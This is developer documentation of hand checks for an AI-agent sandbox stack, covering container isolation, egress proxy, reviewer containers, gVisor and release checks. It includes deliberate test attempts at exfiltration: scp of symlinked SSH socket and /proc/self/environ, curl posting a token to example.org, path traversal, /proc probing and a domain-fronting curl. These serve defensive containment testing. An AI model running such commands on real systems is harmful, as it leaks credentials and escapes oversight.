# Hand checks with Compose

The page is published on 127.0.0.1:7799 (SF_PORT changes it):

```bash
docker compose up -d --build --remove-orphans && docker compose ps   # all healthy
docker ps --filter label=dev.software-factory.stack=software-factory   # one container per running session, <project>-box-<box>
docker exec software-factory-box-<box> curl -sS https://github.com         # refused by the proxy (403)
docker exec software-factory-box-<box> curl -sS -o /dev/null -w '%{http_code}\n' https://api.anthropic.com   # any HTTP status
docker ps -a --filter label=dev.software-factory.reviewer   # during a review one software-factory-reviewer-<run> per running role, none after it
docker exec software-factory-reviewer-<run> ls -a /reviews          # only that run's snapshot folder, no .agent-host-key
docker exec software-factory-reviewer-<run> touch /reviews/<id>/x    # Read-only file system
docker network inspect software-factory-reviewer-<run>       # internal, engine .2, egress .3, reviewer .4, nothing else

docker inspect software-factory-box-<box>                    # the recipe: read-only root, CapDrop ALL, no ports, no binds, its own network only
docker network inspect software-factory-box-<box>            # internal, no IPv6, gateway_mode_ipv4=isolated, engine .2, egress .3, box .4
docker exec software-factory-box-<box> curl -sS --noproxy '*' -m 3 https://helper:8099/healthz   # doesn't resolve: the helper shares no network with a session
docker compose stop helper && docker ps --filter label=dev.software-factory.stack=software-factory   # no session container left
docker compose logs helper | grep -E 'action=(create|start|stop|remove)'   # each operation with box, recipe hash and outcome, never a key
```

`make proctor` checks the `docker inspect` and `docker network inspect` lines for a session's container and the Compose services with Proctor's docker driver (`proctor/specs/stack.yaml`, SES-001; [Proctor's specifications](proctor.md)); the `docker exec` lines, reviewer containers, verification containers and action containers stay by hand; STK-004 checks that no verification container is left over.

**An action with the session's files carries no secret out through a link.** It needs a machine you reach over SSH, `<user>@<host>` on your network, and uses the functions of [Hand checks for the gate and reviews](gate-hand-checks.md): its Setup's, and `acc` and `aid` from its git-host checks. On the Credentials page save an SSH credential `lk` with a key `<host>` accepts for `<user>`, bound to `<host>:22`, and the actions `leak` (target `<host>:22`, the session's files, the command `scp`, `-r`, `dist`, `<user>@<host>:/tmp/x`), `hold` (the same target, no files, the command `ssh`, `<user>@<host>`, `sleep 60`) and `pick` (the same target and files, the command `scp`, `{file}`, `<user>@<host>:/tmp/`, and the argument `file 200 .+`); on the token credential `ex-token` of the gate's checks, an action `env` (target `example.org`, the session's files, the command `curl`, `-sS`, `--data-binary`, `@dist/e`, `https://example.org`) shows the same for a token. Then, in a running session `a`:

```bash
docker exec -w "$(wt a)" "$(ctr a)" sh -c 'mkdir -p dist && ln -sfn /home/action/.ssh/agent.sock dist/k && ln -sfn /in/spec.json dist/s && ln -sfn /proc/self/environ dist/e && echo ok > dist/ok'
acc a "\"op\":\"action-run\",\"action\":\"$(aid leak)\",\"args\":{}"; sleep 20; acc a '"op":"read"' | grep -o '"output":"[^"]*"' | head -n 1
ssh <user>@<host> 'ls /tmp/x; grep -rlc "PRIVATE KEY" /tmp/x; tr "\0" "\n" < /tmp/x/e'
acc a "\"op\":\"action-run\",\"action\":\"$(aid hold)\",\"args\":{}"; sleep 8; c=$(docker ps -q --filter label=dev.software-factory.action)
docker exec "$c" sh -c 'ls -a /in; for p in /proc/[0-9]*; do tr "\0" " " < $p/cmdline; echo " $p"; done; for p in /proc/[0-9]*; do grep -q action-agent $p/cmdline && { cat $p/environ; head -c 16 $p/mem; ls $p/fd; }; done'
acc a "\"op\":\"action-run\",\"action\":\"$(aid pick)\",\"args\":{\"file\":\"/in/spec.json\"}}"; acc a "\"op\":\"action-run\",\"action\":\"$(aid pick)\",\"args\":{\"file\":\"dist/../../../../in/spec.json\"}}"
```

- The cards of `leak`, `pick` and `env` are high risk (red) with a box to tick, and none says "The agent never gets the secret": each starts "Runs in a container of its own with …; the agent sees only the output, with secrets withheld." (`leak`'s with "lk's key, which the command can't read"), then `leak`'s says "It reads this session's files at /work, which the agent wrote, so they can make it use lk's key at `<host>:22` for anything the key allows.", and `env`'s that they "can make it send ex-token's secret to example.org or print it past the output check", with "The command gets ex-token's secret and can do anything the secret allows at example.org." after it. `hold`'s is medium, red only for the LAN address.
- `leak`'s output has `scp: dist/k: not a regular file` and `scp: dist/s: No such file or directory`; on `<host>`, `/tmp/x` holds `ok` and `e`, no file holds `PRIVATE KEY`, and `e` holds only the run's `PATH`, `HOME`, `LANG`, `TERM`, proxy variables and `SSH_AUTH_SOCK`. `env`, on the other hand, sends `EX_TOKEN=sf-dev-ex-value`: a token the command must read is the residual its card names.
- In `hold`'s container, `/in` holds only `.` and `..`, the processes are `docker-init`, `ssh …`, its `nc …` and `software-factory action-agent`, and the agent's `environ`, `mem` and `fd` answer `Permission denied`, though `docker exec` runs as `action` too. Its first output line isn't `software-factory action: read its command`: the engine takes that line out.
- `pick` with `/in/spec.json` is refused 400 `args` with "File can't start with / or ~, so it names no path outside th", and with `dist/../…` with "File can't hold a .. part, so it names no path outside the w": a run from the Access dialog (`StartAction`) clips the refusal to 60 bytes, while the agent's `factory_action` gets the whole reason in a `refused` answer.

**Run the live checks on your own Docker, with your Software Factory stopped.** The owner chose this over Docker-in-Docker on 2026-11-17 and accepted the risk. The helper creates and removes containers, networks and volumes, and acts only on those carrying its stack's label, so a defect in it, or in a check, could still reach your other projects on that Docker. Stop your own stack first (`docker compose -p software-factory down`; its volumes stay), then start the development overlay as CLAUDE.md says, with `SF_DOCKER_GID` set as `make up` sets it, on the `127.0.0.1` port it publishes. Make the first start after a change to the helper a dry run, `SF_BOX_SWEEP_DRY=1`, and read what its start-up sweep would remove before you start without it. Docker Desktop can't add a runtime, so gVisor checks need a Linux host with `runsc` installed and registered. To set it up, extract `runsc` from the release's `gvisor.tar.bz2` after `sha512sum -c` of the `.sha512` beside it, run `runsc install`, then send `dockerd` a SIGHUP (`kill -HUP`), which loads the new runtime without a restart (checked with Engine 29.9.3). The release's Compose files can be tried the same way. Push the image to a `registry:2` container on `127.0.0.1:5000`; Docker talks plain HTTP to a registry on `127.0.0.1` by itself. Write the release's files for that image as below, and run the `up` that `install.sh` runs on them, in a folder of their own with the `software-factory-socket.yaml` that `install.sh` writes for your socket. `install.sh` downloads only from the release on GitHub, so a full run of it waits for a published release.

**What was checked where.** The gVisor overlay was checked only in a privileged `docker:dind` container on Docker Desktop for macOS (arm64), with Docker Engine 29.9.3, Compose 5.7.1 and gVisor release-20261109.0 registered as `runsc`, not on a Linux host of its own and not on amd64: a development fake agent's session got a container on `runsc` (gVisor in its `dmesg`), that container's sandbox check passed, its probe of the network's gateway included, and the session took a turn and wrote its file; without `runsc` registered, the start was refused with the reason and no container was made. A real Claude Code session, a review and a release under gVisor aren't checked yet. `install.sh` was run piped into `sh` in Docker-in-Docker (Engine 29.9.3) against a local registry and a release's three files served over HTTP (its `base` names only GitHub, so that run used an edited copy), with Compose 5.7.1, 5.7.0 and 2.24.4: a fresh install, the same command again over the running stack and an upgrade to a new image digest each ended with every container healthy and the volumes kept; a Compose file changed after the script was written stopped it with nothing in its folder changed, and Compose 2.24.3 was refused. The two Compose files were also checked as the layers of the earlier signed install with Compose 5.2.0 on macOS. Nothing was tried on Windows.

**The basic flows.** Before a change is merged, try these on the development overlay for the parts it touches:

1. Start a session with each agent the page offers, and check what the page shows: agent, sign-in, trust level and work type.
2. Send a message, then press Stop during the turn.
3. Answer a question card and a permission card from the page, with Yes, No and a typed answer.
4. Press Review, wait for both reviewers, then Push. With a `BLOCK-REVIEW` file, see the push held, Deny it, and see that the reviews finishing never push it.
5. Run two sessions at once, and check that cards, files and pushes stay with their own session.
6. Reload the page with a card open, then `docker compose restart engine`: the page reloads itself and signs in again, the session comes back Stopped with its work type and approvals, and **Wake** continues its conversation.
7. Make the sandbox check fail, as below, and check that starts are refused and every running session shows Held.
8. In a session's container, `curl --connect-to gitlab.com:443:claude.ai:443 https://gitlab.com/` fails and `curl https://github.com` is refused.

**The development overlay** runs as its own Compose project, `software-factory-dev`, with its own volumes, so its fake reviews never reach the real stack's repositories and tokens; both publish port 7799. Its fake agent's requirements and plan count only once committed, so commit `.knackpack/<task>/REQUIREMENTS.md` (in knackpack's checked format, with the line `knackpack-requirements/1`), `PLAN.md` and `.knackpack/feature.json` by hand in its worktree, `/workspace/s/<box>/worktrees/sf-<id>` in `software-factory-dev-box-<box>`, then approve them on the page. `make plugin-validate AGENTS_VOLUME=software-factory-dev_agents` validates the plugin with the overlay's installed Claude Code.

**`make dev`** (`dev/watch`) builds the page and a Linux binary on your computer and copies the binary into the `dev-bin` volume through `compose.live.yaml`'s one-off `dev-bin` service; no folder of your computer is mounted into a container. It watches `cmd`, `configs`, `internal`, `tools`, `web`, `plugin`, `go.mod`, `go.sum`, `compose.yaml` and the `Dockerfile`. A save under `web/` alone recreates the engine; any other code change recreates the engine and egress, which also applies a change to `compose.yaml`. The helper runs the binary of the `software-factory:dev` image, so a change to it, to the `Dockerfile`, to `plugin/` or to `configs/claude-code/` needs Ctrl-C, `docker compose -f compose.yaml -f compose.live.yaml build`, then `make dev` again; `make dev` builds the images only when one is missing, and a save there prints that reminder. Each restart of the engine stops every running session (they come back Stopped, and Wake continues them) and deletes uploaded images, which live in a tmpfs volume. A failed build leaves the running stack as it was. Ctrl-C lets a restart in progress finish and leaves the last build running; `make up` goes back to the image. When the checked-out commit changes along with the files, `make dev` stops by itself, since your folder runs as the engine, which holds your git host tokens: stop it before a pull, a branch switch or a checkout of code you haven't read.

**`make run`** builds the page and runs the engine on your computer without Docker, for work on the page alone. Without `SF_HELPER` it starts no session and runs no review; an agent-host run outside Docker answers every route ([Environment variables](environment-variables.md)).

**The release's files** can be written locally as the Release job writes them, into a folder `out`: `cp compose.yaml out/`, `sh scripts/release-compose.sh <image without tag> sha256:<digest> out/compose.release.yaml` (it fails unless it replaced the placeholder image), then `sh scripts/release-install.sh <version> out/compose.yaml out/compose.release.yaml out/install.sh`, which fills `scripts/install.sh`'s three placeholder lines with the version and the SHA-256 of both files and fails unless each was there exactly once, the written script carries all three and no placeholder, and `sh -n` reads it. `scripts/install.sh` run as it is stops with the install command, since its values are placeholders. `make shell` checks it with shellcheck.

**The release check** runs on any rendered configuration: `(cd out && docker compose -f compose.yaml -f compose.release.yaml config --format json) > c.json`, then `sh scripts/release-check.sh <image>@sha256:<digest> c.json`. It is an allow-list, and fails, naming why, on a file that is empty or isn't one JSON object, on any error of `jq` itself, and on anything outside it: a service besides `egress`, `engine` and `helper`, or a `depends_on` on one; an image other than the digest, or a `pull_policy` other than `missing`; a service key outside `cap_drop`, `command`, `depends_on`, `entrypoint`, `environment`, `healthcheck`, `image`, `init`, `logging`, `mem_limit`, `networks`, `pids_limit`, `ports`, `pull_policy`, `read_only`, `restart`, `security_opt`, `stop_grace_period`, `tmpfs`, `user` and `volumes` (so `privileged`, `cap_add`, `devices`, `gpus`, `deploy`, `runtime`, `sysctls`, `pid`, `ipc`, hooks, `provider`, `models` and the like); a `cap_drop` other than `[ALL]`, a `security_opt` other than `["no-new-privileges:true"]`, `read_only` not true, or a user other than the service's own; a port not on `127.0.0.1`; a bind mount; a top-level section besides `name`, `services`, `networks`, `volumes` and `x-` ones, or a project name other than `software-factory`; a network that is `external`, not `bridge`, sets anything but `name`, `internal` and an empty `ipam`, or is named other than `software-factory_<key>`; a volume that is `external`, not `local`, has `driver_opts` other than a tmpfs, or is named other than `software-factory_<key>`; `SF_BOX_LIVE`; any `SF_DEV_` name, in an environment key, a value or a command (it names them); and the helper on any network but `helpernet`.
